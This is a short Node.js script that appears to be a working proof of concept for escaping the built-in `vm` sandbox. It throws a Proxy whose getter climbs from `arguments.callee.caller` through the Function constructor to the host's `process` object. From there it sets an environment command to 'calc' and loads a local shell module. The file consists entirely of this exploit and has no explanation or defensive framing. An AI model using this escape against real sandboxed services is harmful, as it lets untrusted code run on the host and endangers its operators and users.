const vm = require("vm");

const script = 
`
throw new Proxy({}, {
    get: function(){
        const c = arguments.callee.caller
        const p = (c.constructor.constructor("return Reflect.get(global, Reflect.ownKeys(global).find(x=>x.includes('pro')))"))()
        p.env.command="calc"
        return p.mainModule.require("./shell")
    }
})
`;
try {
    vm.runInContext(script, vm.createContext(Object.create(null)));
}catch(e) {
    console.log(e.message) 
}